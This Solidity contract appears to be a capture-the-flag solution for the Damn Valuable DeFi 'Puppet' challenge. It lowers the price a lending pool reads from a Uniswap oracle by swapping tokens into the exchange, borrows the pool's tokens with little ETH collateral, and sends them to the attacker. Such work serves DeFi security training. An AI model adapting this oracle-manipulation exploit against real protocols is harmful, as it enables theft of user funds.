// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../puppet/PuppetPool.sol";

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetAttacker {
    IUniswapExchange public immutable uniswap;
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;

    constructor(
        address _tokenAddress,
        address _uniswapAddress,
        address _poolAddress
    ) {
        token = DamnValuableToken(_tokenAddress);
        uniswap = IUniswapExchange(_uniswapAddress);
        pool = PuppetPool(_poolAddress);
    }

    function attack(uint256 amount) public {
        token.approve(address(uniswap), amount);
        /*
        Thanks transfer tokens to the uniswap,
        the result of the _computeOraclePrice
        function from pool will be significantly lower.
         */
        uniswap.tokenToEthSwapInput(amount - 1, 1, block.timestamp + 1);

        // Check how much token could we get for 1 ETH
        uint256 ethToBorrowOneToken = pool.calculateDepositRequired(1 ether);

        // Calculate the maximal value of token, we can borrow
        uint256 tokenWeCanBorrow = (address(this).balance * 10**18) /
            ethToBorrowOneToken;

        /*
        Check if our tokenWeCanBorrow is not bigger than
        the balance of tokens of pool. If it is bigger, then
        we will borrow all tokens, it not we will
        borrow tokenWeCanBorrow tokens.
         */
        uint256 maxTokenToBorrow;
        if (tokenWeCanBorrow > token.balanceOf(address(pool))) {
            maxTokenToBorrow = token.balanceOf(address(pool));
        } else {
            maxTokenToBorrow = tokenWeCanBorrow;
        }
        pool.borrow{value: address(this).balance}(maxTokenToBorrow);

        // Send back all not used ETH
        msg.sender.call{value: address(this).balance}("");

        // Transfer all token to attacker
        token.approve(msg.sender, token.balanceOf(address(this)));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
